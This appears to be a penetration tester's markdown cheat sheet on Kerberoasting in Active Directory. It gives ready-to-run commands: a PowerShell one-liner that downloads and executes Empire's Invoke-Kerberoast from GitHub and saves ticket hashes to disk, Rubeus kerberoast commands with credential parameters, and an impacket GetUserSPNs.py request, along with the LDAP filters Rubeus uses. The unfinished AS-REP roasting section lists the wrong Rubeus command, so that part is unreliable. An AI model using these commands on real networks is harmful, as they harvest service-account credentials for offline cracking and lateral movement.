---
title: "Kerberoasting"
date: 2020-07-16T13:41:37+02:00
draft: false
---

#### EmpireProject Kerberoasting one-liner

```
IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath ‘c:\users\public\HashCapture.txt’ -Width 8000
```

#### Kerberoasting using Rubeus
The following command shows an example of how to peroform a kerberoasting attack using Rubeus. The outfile parameter ensures that the hashes are in a crackable (non newline delimited) format.

```.\Rubeus.exe kerberoast /creduser:<Domain>\<User> /credpassword:<Password> /domain:<Domain> /dc:<DomainController> /format:hashcat /outfile:roast.txt```

#### Kerberoasting from a non-domain joined machines using impackets GetUserSPNs.py

```
GetUserSPNs.py domain.local/username:password  -request
```
The following Rubeus command executes a keberoast attack for all users within the domain that have a Service Principle Name (SPN) configured.

```Rubeus kerberoast```

The underlying LDAP query Rubeus executes (by default) to look for users is the following one:

```(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))`"```

Broken down, it does the following:

* & - This prefix asserts all subsequent filters must be met.
* (samAccountType=805306368) – Only Active Directory users (not computers, groups, etc.)
* (servicePrincipalName=*) – User accounts that have any service principal name (SPN) entries
* (!samAccountName=krbtgt) – Omit the krbtgt account from this search
* (!(UserAccountControl:1.2.840.113556.1.4.803:=2)) – Omit accounts that are disabled

Rubeus also has flags for directly outputting to a hashcat-crackable format.



#### AS-REP Roasting using Rubeus (ToDo)
```Rubeus kerberoast```

Here the LDAP query looks as follows:
```(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))```
Broken down, it does the following:
* & - All subsequent filters must be met.
* (samAccountType=805306368) - Only Active Directory users (not computers, groups, etc.)
* (userAccountControl:1.2.840.113556.1.4.803:=4194304) – Users have the "Do not require Kerberos preauthentication" enabled.


#### References
https://labs.f-secure.com/blog/attack-detection-fundamentals-discovery-and-lateral-movement-lab-1
